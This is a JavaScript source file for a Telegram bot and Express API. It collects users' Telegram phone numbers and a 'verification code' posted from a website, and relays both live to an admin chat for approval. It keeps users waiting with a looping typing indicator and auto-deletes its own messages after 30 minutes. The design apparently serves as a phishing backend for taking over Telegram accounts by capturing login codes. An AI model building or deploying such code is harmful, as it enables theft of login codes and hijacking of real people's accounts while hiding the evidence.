import express from "express";
import cors from "cors";
import { Telegraf } from "telegraf";

const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBAPP_URL = process.env.WEBAPP_URL;
const WEBSITE_URL = process.env.WEBSITE_URL;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
if (!ADMIN_CHAT_ID) throw new Error("ADMIN_CHAT_ID is not set");

const bot = new Telegraf(BOT_TOKEN);

// memory storage
const userPhones = new Map();
const submissions = new Map();
const scheduledDeletions = new Map(); // FOR TYPING LOOPS + auto-delete

// === Utility functions ===========================

// auto delete timer
function scheduleDelete(chatId, messageId, delayMs = 30 * 60 * 1000) {
  const key = `${chatId}:${messageId}`;
  if (scheduledDeletions.has(key)) {
    clearTimeout(scheduledDeletions.get(key));
  }
  const timeoutId = setTimeout(() => {
    bot.telegram.deleteMessage(chatId, messageId).catch(() => {});
    scheduledDeletions.delete(key);
  }, delayMs);
  scheduledDeletions.set(key, timeoutId);
}

// reply + auto delete
async function replyAndAutoDelete(ctx, text, extra) {
  const msg = await ctx.reply(text, extra);
  scheduleDelete(ctx.chat.id, msg.message_id);
  return msg;
}

// ================= BOT COMMANDS ===================

bot.start(async (ctx) => {
  const payload = ctx.startPayload;

  if (payload && payload.startsWith("verify_")) {
    const code = payload.replace("verify_", "");
    await replyAndAutoDelete(
      ctx,
      `Verification code: <b>${code}</b>\n\nPaki-type ang Telegram phone number mo.`,
      { parse_mode: "HTML" }
    );
  } else {
    await replyAndAutoDelete(
      ctx,
      "Welcome! Paki-send ang phone number or code.",
      { parse_mode: "HTML" }
    );
  }
});

// user text handler
bot.on("text", async (ctx) => {
  const text = ctx.message.text.trim();
  const userId = ctx.from.id.toString();

  const isPhone =
    text.startsWith("+") || text.replace(/\D/g, "").length >= 10;

  if (isPhone) {
    userPhones.set(userId, text);
    await replyAndAutoDelete(
      ctx,
      "Phone saved! Kung may code ka mula sa website, i-send lang dito.",
      { parse_mode: "HTML" }
    );
    return;
  }

  await replyAndAutoDelete(ctx, "Code received.", { parse_mode: "HTML" });
});

// STOP TYPING LOOP helper
function stopTypingLoop(userId) {
  const key = `typing_${userId}`;
  if (scheduledDeletions.has(key)) {
    clearInterval(scheduledDeletions.get(key));
    scheduledDeletions.delete(key);
  }
}

// APPROVE
bot.action(/approve:(.+)/, async (ctx) => {
  const submissionId = ctx.match[1];
  const data = submissions.get(submissionId);

  if (!data) {
    await ctx.answerCbQuery("Not found or expired", { show_alert: true });
    return;
  }

  const userId = data.userId;

  // STOP TYPING LOOP HERE (HIGHLY RECOMMENDED)
  stopTypingLoop(userId);

  await ctx.answerCbQuery("Approved");
  await replyAndAutoDelete(
    ctx,
    `Approved submission:\nUser: ${data.firstName} (@${data.username})\nPhone: ${data.telegramPhone}\nCode: ${data.code}`,
    { parse_mode: "HTML" }
  );
});

// REJECT
bot.action(/reject:(.+)/, async (ctx) => {
  const submissionId = ctx.match[1];
  const data = submissions.get(submissionId);

  if (!data) {
    await ctx.answerCbQuery("Not found or expired", { show_alert: true });
    return;
  }

  const userId = data.userId;

  // STOP TYPING LOOP HERE
  stopTypingLoop(userId);

  await ctx.answerCbQuery("Rejected");
  await replyAndAutoDelete(
    ctx,
    `❌ Rejected submission of user ID: ${userId}`,
    { parse_mode: "HTML" }
  );
});

// ===================================================
//                EXPRESS API ENDPOINT
// ===================================================

const app = express();
app.use(cors());
app.use(express.json());

// RECEIVE CODE FROM WEBSITE
app.post("/api/log-code", async (req, res) => {
  try {
    const { code, tgUser } = req.body;

    if (!code) {
      return res.status(400).json({ ok: false, error: "Code required" });
    }

    const userId = tgUser?.id ? String(tgUser.id) : null;
    const username = tgUser?.username || "";
    const firstName = tgUser?.first_name || "";
    const telegramPhone = userId ? userPhones.get(userId) || "Unknown phone" : "Unknown phone";

    const submissionId = `${userId || "unknown"}_${Date.now()}`;

    submissions.set(submissionId, {
      userId,
      code,
      telegramPhone,
      username,
      firstName,
    });

    // ================== TYPING ONLY EFFECT ===================
    if (userId) {
      try {
        console.log(`Starting typing-only loop for ${userId}`);

        // Clear any existing typing loop
        stopTypingLoop(userId);

        // Loop typing every 4 secs
        const intervalId = setInterval(() => {
          bot.telegram.sendChatAction(userId, "typing").catch(() => {});
        }, 4000);

        scheduledDeletions.set(`typing_${userId}`, intervalId);

        console.log("Typing loop started.");
      } catch (err) {
        console.error("Typing loop error:", err);
      }
    }

    // SEND TO ADMIN
    const logText =
      `🔔 New verification request\n\n` +
      `👤 User: ${firstName} (@${username})\n` +
      `🆔 ID: ${userId}\n` +
      `📱 Phone: ${telegramPhone}\n\n` +
      `🔑 Code: ${code}`;

    await bot.telegram.sendMessage(ADMIN_CHAT_ID, logText, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Approve", callback_data: `approve:${submissionId}` },
            { text: "❌ Reject", callback_data: `reject:${submissionId}` },
          ],
        ],
      },
    });

    return res.json({ ok: true });
  } catch (error) {
    console.error("Error /api/log-code:", error);
    return res.status(500).json({ ok: false, error: "Internal server error" });
  }
});

// simple routes
app.get("/webapp", (req, res) => {
  if (!WEBAPP_URL) return res.status(500).send("WEBAPP_URL missing");
  res.redirect(WEBAPP_URL);
});

app.get("/website", (req, res) => {
  if (!WEBSITE_URL) return res.status(500).send("WEBSITE_URL missing");
  res.redirect(WEBSITE_URL);
});

app.get("/", (req, res) => {
  res.send("Bot + API online");
});

// start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("HTTP server running on", PORT);
});

bot.launch();
console.log("Telegram bot started");

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
